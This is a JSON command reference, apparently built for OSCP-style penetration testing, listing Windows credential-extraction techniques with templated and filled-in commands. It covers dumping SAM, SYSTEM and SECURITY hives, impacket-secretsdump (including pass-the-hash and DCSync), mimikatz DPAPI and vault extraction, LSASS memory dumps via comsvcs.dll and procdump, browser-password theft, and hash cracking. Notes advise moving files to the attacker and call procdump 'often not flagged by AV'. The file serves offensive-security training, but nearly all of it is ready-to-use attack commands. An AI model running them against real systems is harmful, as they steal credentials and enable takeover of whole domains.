{
  "category": "post-exploit",
  "subcategory": "credential-extraction",
  "description": "Windows credential extraction commands for SAM, LSA secrets, LSASS, DPAPI, and remote credential dumping",
  "commands": [
    {
      "id": "reg-save-sam",
      "name": "Registry Save SAM Hive",
      "category": "post-exploit",
      "command": "reg save HKLM\\SAM <OUTPUT_PATH>\\sam.save",
      "description": "Save SAM registry hive containing local account NTLM hashes",
      "tags": ["CREDENTIAL_EXTRACTION", "WINDOWS", "SAM", "REGISTRY", "OSCP:HIGH"],
      "variables": [
        {"name": "<OUTPUT_PATH>", "description": "Writable directory path", "example": "C:\\Windows\\Temp", "required": true}
      ],
      "success_indicators": ["The operation completed successfully"],
      "failure_indicators": ["Access is denied", "ERROR:"],
      "notes": "Requires SYSTEM or Administrator with SeBackupPrivilege. Must also save SYSTEM hive for decryption. Transfer both files to attacker for offline extraction with secretsdump.",
      "oscp_relevance": "high",
      "filled_example": "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save"
    },
    {
      "id": "reg-save-system",
      "name": "Registry Save SYSTEM Hive",
      "category": "post-exploit",
      "command": "reg save HKLM\\SYSTEM <OUTPUT_PATH>\\system.save",
      "description": "Save SYSTEM registry hive containing SAM decryption boot key",
      "tags": ["CREDENTIAL_EXTRACTION", "WINDOWS", "REGISTRY", "OSCP:HIGH"],
      "variables": [
        {"name": "<OUTPUT_PATH>", "description": "Writable directory path", "example": "C:\\Windows\\Temp", "required": true}
      ],
      "success_indicators": ["The operation completed successfully"],
      "failure_indicators": ["Access is denied"],
      "notes": "Required for SAM hash extraction. SYSTEM hive contains boot key (SYSKEY) needed to decrypt SAM hashes. Always extract with SAM hive.",
      "oscp_relevance": "high",
      "filled_example": "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save"
    },
    {
      "id": "reg-save-security",
      "name": "Registry Save SECURITY Hive",
      "category": "post-exploit",
      "command": "reg save HKLM\\SECURITY <OUTPUT_PATH>\\security.save",
      "description": "Save SECURITY registry hive containing LSA secrets and cached domain credentials",
      "tags": ["CREDENTIAL_EXTRACTION", "WINDOWS", "LSA_SECRETS", "REGISTRY", "OSCP:HIGH"],
      "variables": [
        {"name": "<OUTPUT_PATH>", "description": "Writable directory path", "example": "C:\\Windows\\Temp", "required": true}
      ],
      "success_indicators": ["The operation completed successfully"],
      "failure_indicators": ["Access is denied"],
      "notes": "Contains LSA secrets (service account plaintext passwords), cached domain credentials (DCC2 hashes), and DPAPI keys. Requires SYSTEM hive for decryption.",
      "oscp_relevance": "high",
      "filled_example": "reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.save"
    },
    {
      "id": "reg-query-sam",
      "name": "Registry Query SAM Access",
      "category": "post-exploit",
      "command": "reg query HKLM\\SAM",
      "description": "Test access to SAM registry hive to verify privileges",
      "tags": ["CREDENTIAL_EXTRACTION", "WINDOWS", "ENUMERATION", "OSCP:MEDIUM"],
      "variables": [],
      "success_indicators": ["HKEY_LOCAL_MACHINE\\SAM"],
      "failure_indicators": ["Access is denied", "ERROR:"],
      "notes": "Quick test to verify SYSTEM/backup privileges before attempting reg save. If access denied, need to elevate privileges first.",
      "oscp_relevance": "medium",
      "filled_example": "reg query HKLM\\SAM"
    },
    {
      "id": "secretsdump-local-sam",
      "name": "Secretsdump Local SAM Extraction",
      "category": "post-exploit",
      "command": "impacket-secretsdump -sam <SAM_FILE> -system <SYSTEM_FILE> LOCAL",
      "description": "Extract NTLM hashes from local SAM and SYSTEM registry hive backups",
      "tags": ["CREDENTIAL_EXTRACTION", "IMPACKET", "SAM", "OFFLINE", "OSCP:HIGH"],
      "variables": [
        {"name": "<SAM_FILE>", "description": "Path to saved SAM hive", "example": "sam.save", "required": true},
        {"name": "<SYSTEM_FILE>", "description": "Path to saved SYSTEM hive", "example": "system.save", "required": true}
      ],
      "success_indicators": ["Dumping local SAM hashes", "Administrator:500:"],
      "failure_indicators": ["Cannot open", "Decryption failed"],
      "notes": "Run on attacker machine after transferring SAM and SYSTEM files. Output format: username:RID:LM_hash:NTLM_hash. Use NTLM hash for pass-the-hash attacks.",
      "oscp_relevance": "high",
      "filled_example": "impacket-secretsdump -sam sam.save -system system.save LOCAL"
    },
    {
      "id": "secretsdump-lsa-secrets",
      "name": "Secretsdump LSA Secrets Extraction",
      "category": "post-exploit",
      "command": "impacket-secretsdump -security <SECURITY_FILE> -system <SYSTEM_FILE> LOCAL",
      "description": "Extract LSA secrets (service account passwords) from registry hive backups",
      "tags": ["CREDENTIAL_EXTRACTION", "IMPACKET", "LSA_SECRETS", "OFFLINE", "OSCP:HIGH"],
      "variables": [
        {"name": "<SECURITY_FILE>", "description": "Path to saved SECURITY hive", "example": "security.save", "required": true},
        {"name": "<SYSTEM_FILE>", "description": "Path to saved SYSTEM hive", "example": "system.save", "required": true}
      ],
      "success_indicators": ["Dumping LSA Secrets", "_SC_", "$MACHINE.ACC"],
      "failure_indicators": ["Cannot open", "Decryption failed"],
      "notes": "Look for _SC_<ServiceName> entries - these contain PLAINTEXT service account passwords. Also includes $MACHINE.ACC (machine account hash) and DPAPI_SYSTEM key.",
      "oscp_relevance": "high",
      "filled_example": "impacket-secretsdump -security security.save -system system.save LOCAL"
    },
    {
      "id": "secretsdump-cached-creds",
      "name": "Secretsdump Cached Domain Credentials",
      "category": "post-exploit",
      "command": "impacket-secretsdump -security <SECURITY_FILE> -system <SYSTEM_FILE> LOCAL",
      "description": "Extract cached domain credentials (DCC2 hashes) from registry hive backups",
      "tags": ["CREDENTIAL_EXTRACTION", "IMPACKET", "CACHED_CREDENTIALS", "DCC2", "OSCP:HIGH"],
      "variables": [
        {"name": "<SECURITY_FILE>", "description": "Path to saved SECURITY hive", "example": "security.save", "required": true},
        {"name": "<SYSTEM_FILE>", "description": "Path to saved SYSTEM hive", "example": "system.save", "required": true}
      ],
      "success_indicators": ["Dumping cached domain logon information", "domain/username:hash"],
      "failure_indicators": ["No cached credentials found"],
      "notes": "DCC2 hashes cannot be used for pass-the-hash - must be cracked. Format: $DCC2$10240#username#hash. Crack with hashcat -m 2100.",
      "oscp_relevance": "high",
      "filled_example": "impacket-secretsdump -security security.save -system system.save LOCAL"
    },
    {
      "id": "secretsdump-remote",
      "name": "Secretsdump Remote Extraction",
      "category": "post-exploit",
      "command": "impacket-secretsdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET>",
      "description": "Remotely extract SAM hashes, LSA secrets, and cached credentials with admin access",
      "tags": ["CREDENTIAL_EXTRACTION", "IMPACKET", "REMOTE", "OSCP:HIGH"],
      "variables": [
        {"name": "<DOMAIN>", "description": "Domain name or workgroup", "example": "YOURLAB", "required": true},
        {"name": "<USERNAME>", "description": "Admin username", "example": "Administrator", "required": true},
        {"name": "<PASSWORD>", "description": "Admin password", "example": "Password123", "required": true},
        {"name": "<TARGET>", "description": "Target IP or hostname", "example": "192.168.45.100", "required": true}
      ],
      "success_indicators": ["Dumping local SAM hashes", "Dumping LSA Secrets"],
      "failure_indicators": ["Access denied", "Connection refused"],
      "notes": "Requires admin credentials. Extracts all credential types in one command. No file transfer needed. Use -hashes for pass-the-hash authentication.",
      "oscp_relevance": "high",
      "filled_example": "impacket-secretsdump YOURLAB/Administrator:'Password123'@192.168.45.100"
    },
    {
      "id": "secretsdump-hashes",
      "name": "Secretsdump with Pass-the-Hash",
      "category": "post-exploit",
      "command": "impacket-secretsdump -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<TARGET>",
      "description": "Remotely extract credentials using NTLM hash instead of password",
      "tags": ["CREDENTIAL_EXTRACTION", "IMPACKET", "PASS_THE_HASH", "OSCP:HIGH"],
      "variables": [
        {"name": "<NTLM_HASH>", "description": "NTLM hash (32 hex chars)", "example": "31d6cfe0d16ae931b73c59d7e0c089c0", "required": true},
        {"name": "<DOMAIN>", "description": "Domain name", "example": "YOURLAB", "required": true},
        {"name": "<USERNAME>", "description": "Username", "example": "Administrator", "required": true},
        {"name": "<TARGET>", "description": "Target IP", "example": "192.168.45.100", "required": true}
      ],
      "notes": "Use when you have NTLM hash but not plaintext password. Colon prefix required: -hashes :NTLM_HASH (empty LM hash).",
      "oscp_relevance": "high",
      "filled_example": "impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 YOURLAB/Administrator@192.168.45.100"
    },
    {
      "id": "secretsdump-just-dc",
      "name": "Secretsdump Domain Controller (DCSync)",
      "category": "post-exploit",
      "command": "impacket-secretsdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP> -just-dc",
      "description": "Extract all domain account hashes from DC via DRSUAPI (DCSync attack)",
      "tags": ["CREDENTIAL_EXTRACTION", "IMPACKET", "DCSYNC", "DOMAIN_ADMIN", "OSCP:HIGH"],
      "variables": [
        {"name": "<DOMAIN>", "description": "Domain FQDN", "example": "YOURLAB.LOCAL", "required": true},
        {"name": "<USERNAME>", "description": "Domain Admin username", "example": "Administrator", "required": true},
        {"name": "<PASSWORD>", "description": "Password", "example": "Password123", "required": true},
        {"name": "<DC_IP>", "description": "Domain Controller IP", "example": "192.168.45.200", "required": true}
      ],
      "flag_explanations": {
        "-just-dc": "Extract only NTDS.dit domain credentials via DRSUAPI replication, skip SAM/LSA"
      },
      "success_indicators": ["Dumping Domain Credentials", "krbtgt:", "Administrator:500:"],
      "failure_indicators": ["DRSUAPI failed", "Access denied"],
      "notes": "Requires Domain Admin or equivalent. Extracts ALL domain hashes including krbtgt (Golden Ticket). Ultimate goal in AD pentesting. Run against DC only.",
      "oscp_relevance": "high",
      "filled_example": "impacket-secretsdump YOURLAB.LOCAL/Administrator:'Password123'@192.168.45.200 -just-dc"
    },
    {
      "id": "secretsdump-full",
      "name": "Secretsdump Full Extraction",
      "category": "post-exploit",
      "command": "impacket-secretsdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET>",
      "description": "Extract all available credentials (SAM + LSA + cached) from target",
      "tags": ["CREDENTIAL_EXTRACTION", "IMPACKET", "OSCP:HIGH"],
      "variables": [
        {"name": "<DOMAIN>", "description": "Domain or workgroup", "example": "YOURLAB", "required": true},
        {"name": "<USERNAME>", "description": "Admin username", "example": "Administrator", "required": true},
        {"name": "<PASSWORD>", "description": "Password", "example": "Password123", "required": true},
        {"name": "<TARGET>", "description": "Target IP", "example": "192.168.45.100", "required": true}
      ],
      "notes": "Default behavior extracts everything accessible. On member servers: SAM + LSA + cached. On DCs: add -just-dc for NTDS.dit.",
      "oscp_relevance": "high",
      "filled_example": "impacket-secretsdump YOURLAB/Administrator:'Password123'@192.168.45.100"
    },
    {
      "id": "secretsdump-ntds-offline",
      "name": "Secretsdump NTDS.dit Offline",
      "category": "post-exploit",
      "command": "impacket-secretsdump -ntds <NTDS_FILE> -system <SYSTEM_FILE> LOCAL",
      "description": "Extract domain hashes from offline NTDS.dit database backup",
      "tags": ["CREDENTIAL_EXTRACTION", "IMPACKET", "NTDS", "OFFLINE", "OSCP:HIGH"],
      "variables": [
        {"name": "<NTDS_FILE>", "description": "Path to NTDS.dit file", "example": "ntds.dit", "required": true},
        {"name": "<SYSTEM_FILE>", "description": "Path to SYSTEM hive from same DC", "example": "system.save", "required": true}
      ],
      "notes": "Use when you've extracted NTDS.dit via shadow copy or backup. SYSTEM hive must be from same DC. Extracts all domain account hashes.",
      "oscp_relevance": "high",
      "filled_example": "impacket-secretsdump -ntds ntds.dit -system system.save LOCAL"
    },
    {
      "id": "mimikatz-sekurlsa-dpapi",
      "name": "Mimikatz DPAPI Master Keys",
      "category": "post-exploit",
      "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::dpapi\" \"exit\"",
      "description": "Extract DPAPI master keys from LSASS for decrypting browser passwords and credential manager",
      "tags": ["CREDENTIAL_EXTRACTION", "MIMIKATZ", "DPAPI", "OSCP:HIGH"],
      "variables": [],
      "success_indicators": ["DPAPI_SYSTEM", "masterkey", "GUID"],
      "failure_indicators": ["ERROR kuhl_m_sekurlsa"],
      "notes": "DPAPI keys decrypt browser passwords, Credential Manager, and other protected data. Keys tied to user sessions in LSASS. Requires debug privilege.",
      "oscp_relevance": "high",
      "filled_example": "mimikatz.exe \"privilege::debug\" \"sekurlsa::dpapi\" \"exit\""
    },
    {
      "id": "mimikatz-vault-cred",
      "name": "Mimikatz Credential Vault",
      "category": "post-exploit",
      "command": "mimikatz.exe \"privilege::debug\" \"vault::cred /patch\" \"exit\"",
      "description": "Extract Windows Credential Manager vault entries (RDP, network passwords)",
      "tags": ["CREDENTIAL_EXTRACTION", "MIMIKATZ", "CREDENTIAL_MANAGER", "OSCP:HIGH"],
      "variables": [],
      "success_indicators": ["TargetName:", "UserName:", "Password:"],
      "failure_indicators": ["ERROR", "vault not found"],
      "notes": "Credential Manager stores saved RDP credentials, network passwords, and web credentials. /patch enables extraction from protected vault. Rich source of reusable credentials.",
      "oscp_relevance": "high",
      "filled_example": "mimikatz.exe \"privilege::debug\" \"vault::cred /patch\" \"exit\""
    },
    {
      "id": "comsvcs-minidump",
      "name": "LSASS Dump via comsvcs.dll",
      "category": "post-exploit",
      "command": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <LSASS_PID> <OUTPUT_PATH>\\lsass.dmp full",
      "description": "Dump LSASS memory using built-in comsvcs.dll (no external tools needed)",
      "tags": ["CREDENTIAL_EXTRACTION", "LSASS", "MEMORY_DUMP", "LIVING_OFF_THE_LAND", "OSCP:HIGH"],
      "variables": [
        {"name": "<LSASS_PID>", "description": "LSASS process ID (from tasklist)", "example": "672", "required": true},
        {"name": "<OUTPUT_PATH>", "description": "Writable directory", "example": "C:\\Windows\\Temp", "required": true}
      ],
      "success_indicators": ["dump file created"],
      "failure_indicators": ["access denied", "invalid parameter"],
      "notes": "Living-off-the-land technique - uses built-in Windows DLL. Get PID: tasklist /fi \"imagename eq lsass.exe\". Analyze dump offline with mimikatz or pypykatz.",
      "oscp_relevance": "high",
      "filled_example": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full"
    },
    {
      "id": "procdump-lsass",
      "name": "Procdump LSASS Memory Dump",
      "category": "post-exploit",
      "command": "procdump.exe -ma lsass.exe <OUTPUT_PATH>\\lsass.dmp",
      "description": "Create full memory dump of LSASS process using Sysinternals procdump",
      "tags": ["CREDENTIAL_EXTRACTION", "LSASS", "MEMORY_DUMP", "SYSINTERNALS", "OSCP:HIGH"],
      "variables": [
        {"name": "<OUTPUT_PATH>", "description": "Output directory", "example": "C:\\Windows\\Temp", "required": true}
      ],
      "flag_explanations": {
        "-ma": "Full memory dump (include all memory, not just active)"
      },
      "success_indicators": ["Dump 1 complete", "lsass.dmp created"],
      "failure_indicators": ["Access denied", "Cannot attach"],
      "notes": "Signed Microsoft tool - often not flagged by AV. Download from Sysinternals. Analyze dump offline with mimikatz sekurlsa::minidump or pypykatz.",
      "oscp_relevance": "high",
      "filled_example": "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp"
    },
    {
      "id": "pypykatz-minidump",
      "name": "Pypykatz Parse LSASS Dump",
      "category": "post-exploit",
      "command": "pypykatz lsa minidump <DUMP_FILE>",
      "description": "Extract credentials from LSASS memory dump on Linux using pypykatz",
      "tags": ["CREDENTIAL_EXTRACTION", "LSASS", "OFFLINE", "LINUX", "OSCP:HIGH"],
      "variables": [
        {"name": "<DUMP_FILE>", "description": "Path to LSASS dump file", "example": "lsass.dmp", "required": true}
      ],
      "success_indicators": ["credman", "msv", "kerberos", "NTLM:"],
      "failure_indicators": ["Invalid minidump", "Cannot parse"],
      "notes": "Pure Python mimikatz - analyze Windows LSASS dumps on Kali. No Windows needed. Same output as mimikatz sekurlsa::logonpasswords.",
      "oscp_relevance": "high",
      "filled_example": "pypykatz lsa minidump lsass.dmp"
    },
    {
      "id": "sharpchromium-logins",
      "name": "SharpChromium Browser Passwords",
      "category": "post-exploit",
      "command": "SharpChromium.exe logins",
      "description": "Extract saved passwords from Chrome/Edge browsers using DPAPI decryption",
      "tags": ["CREDENTIAL_EXTRACTION", "BROWSER", "CHROME", "DPAPI", "OSCP:MEDIUM"],
      "variables": [],
      "success_indicators": ["URL:", "Username:", "Password:"],
      "failure_indicators": ["No logins found", "Access denied"],
      "notes": "Extracts Chrome/Edge saved passwords. Requires access to user profile and DPAPI keys. Run in user context or with mimikatz DPAPI keys extracted.",
      "oscp_relevance": "medium",
      "filled_example": "SharpChromium.exe logins"
    },
    {
      "id": "cmdkey-list",
      "name": "List Credential Manager Entries",
      "category": "post-exploit",
      "command": "cmdkey /list",
      "description": "List Windows Credential Manager stored credentials (RDP, network shares)",
      "tags": ["CREDENTIAL_EXTRACTION", "ENUMERATION", "CREDENTIAL_MANAGER", "OSCP:HIGH"],
      "variables": [],
      "success_indicators": ["Target:", "Type:", "User:"],
      "failure_indicators": ["Currently stored credentials: * NONE *"],
      "notes": "Shows saved credentials including RDP, network shares, and runas. Entries can be extracted with mimikatz vault::cred. Look for TERMSRV (RDP) and domain credentials.",
      "oscp_relevance": "high",
      "filled_example": "cmdkey /list"
    },
    {
      "id": "hashcat-dcc2",
      "name": "Hashcat Crack DCC2 Hashes",
      "category": "post-exploit",
      "command": "hashcat -m 2100 <HASH_FILE> <WORDLIST>",
      "description": "Crack Windows cached domain credentials (DCC2/MSCash2) with hashcat",
      "tags": ["CREDENTIAL_CRACKING", "HASHCAT", "DCC2", "CACHED_CREDENTIALS", "OSCP:HIGH"],
      "variables": [
        {"name": "<HASH_FILE>", "description": "File containing DCC2 hashes", "example": "dcc2.txt", "required": true},
        {"name": "<WORDLIST>", "description": "Wordlist for cracking", "example": "/usr/share/wordlists/rockyou.txt", "required": true}
      ],
      "flag_explanations": {
        "-m 2100": "Hash mode for Domain Cached Credentials 2 (DCC2/MSCash2)"
      },
      "notes": "DCC2 uses PBKDF2 with 10240 iterations - slow to crack. Use GPU acceleration. Hash format: $DCC2$10240#username#hash. Cannot be used for pass-the-hash.",
      "oscp_relevance": "high",
      "filled_example": "hashcat -m 2100 dcc2.txt /usr/share/wordlists/rockyou.txt"
    },
    {
      "id": "john-mscash2",
      "name": "John Crack MSCash2 Hashes",
      "category": "post-exploit",
      "command": "john --format=mscash2 <HASH_FILE> --wordlist=<WORDLIST>",
      "description": "Crack Windows cached domain credentials with John the Ripper",
      "tags": ["CREDENTIAL_CRACKING", "JOHN", "DCC2", "CACHED_CREDENTIALS", "OSCP:HIGH"],
      "variables": [
        {"name": "<HASH_FILE>", "description": "File containing DCC2 hashes", "example": "dcc2.txt", "required": true},
        {"name": "<WORDLIST>", "description": "Wordlist for cracking", "example": "/usr/share/wordlists/rockyou.txt", "required": true}
      ],
      "flag_explanations": {
        "--format=mscash2": "Force MSCash2 (DCC2) hash format"
      },
      "notes": "Alternative to hashcat for DCC2 cracking. Slower than GPU but works on all systems. Use --rules for better coverage.",
      "oscp_relevance": "high",
      "filled_example": "john --format=mscash2 dcc2.txt --wordlist=/usr/share/wordlists/rockyou.txt"
    }
  ]
}
